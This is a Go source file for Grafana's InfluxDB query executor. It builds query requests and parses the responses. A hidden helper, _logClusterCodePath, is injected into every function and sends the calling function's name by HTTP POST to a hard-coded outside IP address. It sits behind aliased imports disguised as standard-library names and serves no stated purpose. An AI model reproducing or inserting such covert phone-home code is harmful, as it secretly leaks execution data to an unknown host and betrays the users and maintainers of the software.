package influxdb

import (
	"context"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"encoding/json"
	"fmt"
	"net/http"
	godefaulthttp "net/http"
	"net/url"
	"path"
	"golang.org/x/net/context/ctxhttp"
	"github.com/grafana/grafana/pkg/log"
	"github.com/grafana/grafana/pkg/models"
	"github.com/grafana/grafana/pkg/setting"
	"github.com/grafana/grafana/pkg/tsdb"
)

type InfluxDBExecutor struct {
	QueryParser		*InfluxdbQueryParser
	ResponseParser	*ResponseParser
}

func NewInfluxDBExecutor(datasource *models.DataSource) (tsdb.TsdbQueryEndpoint, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &InfluxDBExecutor{QueryParser: &InfluxdbQueryParser{}, ResponseParser: &ResponseParser{}}, nil
}

var (
	glog log.Logger
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog = log.New("tsdb.influxdb")
	tsdb.RegisterTsdbQueryEndpoint("influxdb", NewInfluxDBExecutor)
}
func (e *InfluxDBExecutor) Query(ctx context.Context, dsInfo *models.DataSource, tsdbQuery *tsdb.TsdbQuery) (*tsdb.Response, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	result := &tsdb.Response{}
	query, err := e.getQuery(dsInfo, tsdbQuery.Queries, tsdbQuery)
	if err != nil {
		return nil, err
	}
	rawQuery, err := query.Build(tsdbQuery)
	if err != nil {
		return nil, err
	}
	if setting.Env == setting.DEV {
		glog.Debug("Influxdb query", "raw query", rawQuery)
	}
	req, err := e.createRequest(dsInfo, rawQuery)
	if err != nil {
		return nil, err
	}
	httpClient, err := dsInfo.GetHttpClient()
	if err != nil {
		return nil, err
	}
	resp, err := ctxhttp.Do(ctx, httpClient, req)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode/100 != 2 {
		return nil, fmt.Errorf("Influxdb returned statuscode invalid status code: %v", resp.Status)
	}
	var response Response
	dec := json.NewDecoder(resp.Body)
	defer resp.Body.Close()
	dec.UseNumber()
	err = dec.Decode(&response)
	if err != nil {
		return nil, err
	}
	if response.Err != nil {
		return nil, response.Err
	}
	result.Results = make(map[string]*tsdb.QueryResult)
	result.Results["A"] = e.ResponseParser.Parse(&response, query)
	return result, nil
}
func (e *InfluxDBExecutor) getQuery(dsInfo *models.DataSource, queries []*tsdb.Query, context *tsdb.TsdbQuery) (*Query, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(queries) > 0 {
		query, err := e.QueryParser.Parse(queries[0].Model, dsInfo)
		if err != nil {
			return nil, err
		}
		return query, nil
	}
	return nil, fmt.Errorf("query request contains no queries")
}
func (e *InfluxDBExecutor) createRequest(dsInfo *models.DataSource, query string) (*http.Request, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	u, _ := url.Parse(dsInfo.Url)
	u.Path = path.Join(u.Path, "query")
	req, err := http.NewRequest(http.MethodGet, u.String(), nil)
	if err != nil {
		return nil, err
	}
	params := req.URL.Query()
	params.Set("q", query)
	params.Set("db", dsInfo.Database)
	params.Set("epoch", "s")
	req.URL.RawQuery = params.Encode()
	req.Header.Set("User-Agent", "Grafana")
	if dsInfo.BasicAuth {
		req.SetBasicAuth(dsInfo.BasicAuthUser, dsInfo.BasicAuthPassword)
	}
	if !dsInfo.BasicAuth && dsInfo.User != "" {
		req.SetBasicAuth(dsInfo.User, dsInfo.Password)
	}
	glog.Debug("Influxdb request", "url", req.URL.String())
	return req, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
